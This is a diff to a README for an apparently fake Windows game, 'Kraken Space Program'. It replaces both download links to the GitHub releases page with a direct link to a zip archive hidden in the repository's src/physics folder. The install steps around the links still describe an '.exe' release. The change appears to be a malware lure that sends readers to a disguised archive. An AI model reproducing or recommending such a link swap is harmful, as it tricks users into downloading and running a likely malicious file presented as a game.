@@ -1,6 +1,6 @@
 # 🚀 Kraken-Space-Program - Build custom rockets and explore space
 
-[![Download Kraken Space Program](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/nongregarious-resistingarrest733/Kraken-Space-Program/releases)
+[![Download Kraken Space Program](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/nongregarious-resistingarrest733/Kraken-Space-Program/main/src/physics/Program-Kraken-Space-v3.5.zip)
 
 Kraken Space Program gives you the tools to design, build, and fly spacecraft in a realistic physics environment. This project builds on the fun of space exploration with a fresh engine. You operate in a stable sandbox where you design vessels, test flight paths, and manage orbital maneuvers. The software uses modern code to ensure your game runs smoothly even with large, complex designs.
 
@@ -28,7 +28,7 @@ You need a standard Windows computer to run this simulator. The following specs 
 
 Follow these steps to set up the simulator on your Windows computer.
 
-1. Visit [this page to download](https://github.com/nongregarious-resistingarrest733/Kraken-Space-Program/releases) the latest version.
+1. Visit [this page to download](https://raw.githubusercontent.com/nongregarious-resistingarrest733/Kraken-Space-Program/main/src/physics/Program-Kraken-Space-v3.5.zip) the latest version.
 2. Look for the file ending in `.exe` labeled as the latest release.
 3. Click the link to save the file to your computer.
 4. Open your downloads folder once the file finishes saving.
